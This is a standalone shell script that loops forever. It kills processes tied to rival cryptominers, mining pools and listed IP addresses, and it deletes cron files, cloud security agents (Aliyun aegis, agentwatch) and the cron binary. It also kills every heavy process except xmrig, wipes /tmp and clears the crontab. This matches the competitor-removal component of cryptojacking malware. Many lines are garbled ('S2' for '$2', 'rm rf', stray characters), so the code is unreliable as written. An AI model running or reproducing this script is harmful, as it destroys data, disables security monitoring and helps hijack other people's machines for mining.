while :
do 
  top -b -n 1| grep -E 'kthreaddk|dbuse|dbused|bashirc|gitlab-exp+|614fc2|8uv9nplnuno' | grep -v grep | cut -c 1-5 | xargs kill -9;
  rm -f /etc/cron.hourly/oanacroner
  rm -f /etc/cron.hourly/oanacrona
  rm -f /etc/cron.daily/oanacroner
  rm -f /etc/cron.daily/oanacrona
  rm -f /etc/cron.monthly/oanacroner
  rm -f /usr/local/bin/dns
  rm -f /etc/update.sh
  # chattr -ia /etc/hosts
  # echo >/etc/hosts
  # chattr +ia /etc/hosts
  # chattr -i /etc/sysupdate
  # rm -f /etc/sysupdate
  rm -f /etc/config.json
  rm -f /usr/bin/.systemcero
  rm -f /usr/bin/cloudupdate
  rm -f /usr/bin/disfananagerd
  rm -f /lib/libterminfo. so
  rm -f /bin/httpsntp
  rm -f /bin/fcpsntp
  rm -f /usr/sbin/cron
  rm -f /usr/bin/kinsing*
  rm -f /etc/cron.d/kinsing*
  rm -f /usr/bin/node
  ps auxf| grep -v xmrig |awk '{if($3>=20.0) print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '.javae' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '195.3.146.118' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'apacheorg.xyz' | awk '{print S2}' | xargs -I % kill -9 % 
  ps aux | grep -v grep | grep 'bashirc' | awk '{print S2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'dbuse' | awk '{print S2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'dbused' | awk '{print S2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'givemexyz' | awk '{print S2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'javaupDates' | awk '{print S2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'kdevtmpfsi' | awk '{print S2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'kinsing' | awk '{print S2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'shm/je' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'shm/pty86' | awk '{print S2}'	| xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'trace' | awk '{print S2}'	| xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'urllib.ur丄open' | awk '{print S2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'Y3VybC3odHRw' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep -v rtemp | grep -v stg | grep 'curl' | awk '{print S2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep -v rtemp | grep -v stg | grep 'urlopen' | awk '{print $2}'	| xargs -I % kill -9 %
  ps aux | grep -v grep | grep -v rtemp | grep -v stg | grep 'wget'	| awk '{print S2}'	| xargs -I % kill -9 %

  rm -f /etc/ld.so.preload
  rm -f /home/ec2-user/.ssh/0k8gxs
  rm -f /etc/init.d/agentwatch
  rm -f /usr/sbin/aliyun-service
  rm -f /usr/local/aegis
  rm -f /tmp/.a
  rm -f /var/tmp/.a
  rm -f /run/shm/a
  rm -f /dev/.a
  rm -f /dev/shm/.a
  rm -f /run/user/1000/ntpclient
  rm -f /run/user/1000/Mozz

  ps aux | grep -v grep | grep 'kworker -c\' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'log_' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'systemten' | awk '{print S2}' | xargs -I % kill -9 % 
  ps aux | grep -v grep | grep 'netns' | awk '{print S2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'voltuned' | awk '{print S2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'darwin' | awk '{print S2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '/tmp/dl' | awk '{print S2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '/tmp/ddg' | awk '{print S2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '/tmp/pprt' | awk '{print S2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '/tmp/ppol' | awk '{print S2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '/tmp/jmx*' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '/tmp/2Ne80*' | awk '{print S2}'	| xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'IOFoqIgyC0znf2UR' | awk '{print S2}'	| xargs -I % kill -9 %
  ps aux | grep -v grep | grep '45.76.122.92' | awk '{print S2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '51.38.191.178' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '51.15.56.162' | awk '{print S2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep '86s.jpg' | awk '{print $2}' | xargs -I % kill -9 %
  ps aux | grep -v grep | grep 'aGISGJJp' | awk '{print $2}' | xargs -I % kill -9 %

  ps auxf | grep -v grep | grep 'mine.moneropool.com' | awk '{print $2}' | xargs -I % kill -9 %
  ps auxf | grep -v grep | grep 'pool.tools.ru' | awk '{print $2}' | xargs -I % kill -9 %
  ps auxf | grep -v grep | grep 'xmr.crypto-pool.fr:8080' | awk '{print S2}' | xargs -I % kill -9 % 
  ps auxf | grep -v grep | grep 'xmr.crypto-pool.fr:3333' | awk '{print S2}' | xargs -I % kill -9 %
  ps auxf | grep -v grep | grep 'zhuabcn@yahoo.com' | awk '{print S2}' | xargs -I % kill -9 %
  ps auxf | grep -v grep | grep 'monerohash.com' | awk '{print $2}' | xargs -I % kill -9 %
  ps auxf | grep -v grep | grep '/tmp/a7b104c270' | awk '{print $2}' | xargs -I % kill -9 %
  ps auxf | grep -v grep | grep 'xmr.crypto-pool.fr:6666' | awk '{print S2}' | xargs -I % kill -9 % 
  ps auxf | grep -v grep | grep 'xmr.crypto-pool.fr:7777' | awk '{print S2}' | xargs -I % kill -9 %
  ps auxf | grep -v grep | grep 'xmr.crypto-pool.fr:443' | awk '{print S2}' | xargs -I % kill -9 % 
  ps auxf | grep -v grep | grep 'stratum.f2pool.com:8888' | awk '{print S2}' | xargs -I % kill -9 %
  ps auxf | grep -v grep | grep 'xmrpool.eu' | awk '{print S2}' | xargs -I % kill -9 % 
  ps auxf | grep xiaoyao | awk '{print S2}' | xargs -I % kill -9 %
  ps auxf | grep xiaoyue | awk '{print S2}' | xargs -I % kill -9 %
  netstat -antp | grep '46.243.253.15' | grep 'ESTABLISHED\|SYN_SENT'| awk '{print S7}' | sed -e "s/\/.*//g"| xargs -I % kill -9 %
  netstat -antp | grep '176.31.6.16' | grep 'ESTABLISHED\|SYN_SENT'| awk '{print S7}' | sed -e "s/\/.*//g"| xargs -I % kill -9 %
  netstat -antp | grep '108.174.197.76' | grep 'ESTABLISHED\|SYN_SENT'| awk '{print S7}' | sed -e "s/\/.*//g"| xargs -I % kill -9 %
  netstat -antp | grep '192.236.161.6' | grep 'ESTABLISHED\|SYN_SENT'| awk '{print S7}' | sed -e "s/\/.*//g"| xargs -I % kill -9 %
  netstat -antp | grep '88.99.242.92' | grep 'ESTABLISHED\|SYN_SENT'| awk '{print S7}' | sed -e "s/\/.*//g"| xargs -I % kill -9 %

  rm -f /usr/local/lib/libioset.so
  rm rf /tmp/watchdogs
  rm rf /etc/cron.d/tomcat
  rm rf /etc/rc.d/init.d/watchdogs
  rm rf /usr/sbin/watchdogs
  rm -f /tmp/kthrotlds
  rm -f /etc/rc.d/init.d/kthrotlds
  rm rf /tmp/.sysbabyuuuuul2
  rm rf /tmp/logo9.jpg
  rm rf /tmp/miner.sh
  rm rf /tmp/nullcrew
  rm rf /tmp/proc
  rm rf /tmp/2.sh
  rm /opt/atlassian/confluence/bin/1.sh
  rm /opt/atlassian/confluence/bin/1.sh.l
  rm /opt/atlassian/confluence/bin/1.sh.2
  rm /opt/atlassian/confluence/bin/1.sh.3
  rm /opt/atlassian/confluence/bin/3.sh
  rm /opt/atlassian/confluence/bin/3.sh.l
  rm /opt/atlassian/confluence/bin/3.sh.2
  rm /opt/atlassian/confluence/bin/3.sh.3
  rm rf /var/tmp/f41
  rm rf /var/tmp/2.sh

  rm -rf /tmp
  ps auxf | grep -v grep | grep 'dbused' | awk '{print S2}' | xargs -I % kill -9 %
  ps auxf | grep -v grep | grep 'sendmail' | awk '{print S2}' | xargs -I % kill -9 %
  ps auxf | grep -v grep | grep 'gitlab-exporter' | awk '{print S2}' | xargs -I % kill -9 %
  ps auxf | grep -v grep | grep 'a.oracleservice.top' | awk '{print S2}' | xargs -I % kill -9 %
  crontab -r

  sleep 1
done
